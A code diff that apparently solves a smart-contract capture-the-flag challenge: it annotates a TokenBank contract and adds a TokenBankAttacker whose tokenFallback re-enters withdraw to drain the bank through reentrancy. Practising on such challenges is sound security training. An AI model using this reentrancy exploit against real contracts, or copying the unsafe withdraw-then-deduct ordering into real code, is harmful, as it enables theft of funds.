@@ -116,13 +116,13 @@ contract TokenBankChallenge {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
 
-        balanceOf[from] += value;
+        balanceOf[from] += value; // the transfer msg.sender's balance get deducted on ERC token contract, but get increase in TokenBankChallenge
     }
 
     function withdraw(uint256 amount) public {
-        require(balanceOf[msg.sender] >= amount);
+        require(balanceOf[msg.sender] >= amount,"not enough amount");
 
-        require(token.transfer(msg.sender, amount));
+        require(token.transfer(msg.sender, amount),"transfer fail");
         unchecked {
             balanceOf[msg.sender] -= amount;
         }
@@ -130,11 +130,39 @@ contract TokenBankChallenge {
 }
 
 // Write your exploit contract below
-contract TokenBankAttacker {
+contract TokenBankAttacker is ITokenReceiver {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
+    uint256 count = 0;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+
+    function callWithdraw() public {
+        challenge.withdraw( 500000 * 10 ** 18);
+    }
+
+    function deposit() public {
+        token = challenge.token();
+        token.transfer(address(challenge),500000 * 10 ** 18 );
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) external{
+        if(count == 0 || count == 2){
+            count+=1;
+        }else  {
+            count+=1;
+            challenge.withdraw(500000 * 10 ** 18);
+            
+        }
+       
+
+    }
+
 }
